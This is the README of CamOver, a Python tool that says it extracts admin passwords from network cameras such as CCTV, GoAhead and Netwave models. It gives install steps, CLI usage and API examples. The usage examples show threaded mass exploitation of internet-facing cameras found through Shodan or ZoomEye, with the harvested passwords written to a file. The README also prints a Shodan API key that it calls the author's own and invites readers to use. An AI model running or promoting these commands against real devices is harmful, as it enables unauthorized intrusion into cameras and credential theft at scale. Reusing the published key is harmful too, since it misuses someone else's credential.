# CamOver

[![Developer](https://img.shields.io/badge/developer-EntySec-blue.svg)](https://entysec.com)
[![Language](https://img.shields.io/badge/language-Python-blue.svg)](https://github.com/EntySec/CamOver)
[![Forks](https://img.shields.io/github/forks/EntySec/CamOver?style=flat&color=green)](https://github.com/EntySec/CamOver/forks)
[![Stars](https://img.shields.io/github/stars/EntySec/CamOver?style=flat&color=yellow)](https://github.com/EntySec/CamOver/stargazers)
[![CodeFactor](https://www.codefactor.io/repository/github/EntySec/CamOver/badge)](https://www.codefactor.io/repository/github/EntySec/CamOver)

CamOver is a camera exploitation tool that allows to disclosure network camera admin password.

## Features

* Exploits vulnerabilities in most popular camera models such as `CCTV`, `GoAhead` and `Netwave`.
* Optimized to exploit multiple cameras at one time from list with threading enabled.
* Simple CLI and API usage.

## Installation

```shell
pip3 install git+https://github.com/EntySec/CamOver
```

## Basic usage

To use CamOver just type `camover` in your terminal.

```
usage: camover [-h] [-t] [-o OUTPUT] [-i INPUT] [-a ADDRESS] [--shodan SHODAN]
               [--zoomeye ZOOMEYE] [-p PAGES]

CamOver is a camera exploitation tool that allows to disclosure network camera
admin password.

optional arguments:
  -h, --help            show this help message and exit
  -t, --threads         Use threads for fastest work.
  -o OUTPUT, --output OUTPUT
                        Output result to file.
  -i INPUT, --input INPUT
                        Input file of addresses.
  -a ADDRESS, --address ADDRESS
                        Single address.
  --shodan SHODAN       Shodan API key for exploiting devices over Internet.
  --zoomeye ZOOMEYE     ZoomEye API key for exploiting devices over Internet.
  -p PAGES, --pages PAGES
                        Number of pages you want to get from ZoomEye.
```

### Examples

**Exploiting single camera**

Let's hack my camera just for fun.

```shell
camover -a 192.168.99.100
```

**Exploiting cameras from Internet**

Let's try to use Shodan search engine to exploit cameras over Internet, we will use it with `-t` for fast exploitation.

```shell
camover -t --shodan PSKINdQe1GyxGgecYz2191H2JoS9qvgD
```

**NOTE:** Given Shodan API key (`PSKINdQe1GyxGgecYz2191H2JoS9qvgD`) is my PRO API key, you can use this key or your own,
be free to use all our resources for free :)

**Exploiting cameras from input file**

Let's try to use opened database of cameras with `-t` for fast exploitation.

```shell
camover -t -i cameras.txt -o passwords.txt
```

**NOTE:** It will exploit all cameras in `cameras.txt` list by their addresses and save all obtained passwords
to `passwords.txt`.

## API usage

CamOver also has their own Python API that can be invoked by importing CamOver to your code.

```python
from camover import CamOver
```

### Basic functions

There are all CamOver basic functions that can be used to exploit specified camera.

* `exploit(address)` - Exploit single camera by given address.

### Examples

**Exploiting single camera**

```python
from camover import CamOver

camover = CamOver()
creds = camover.exploit('192.168.99.100')

print(creds)
```
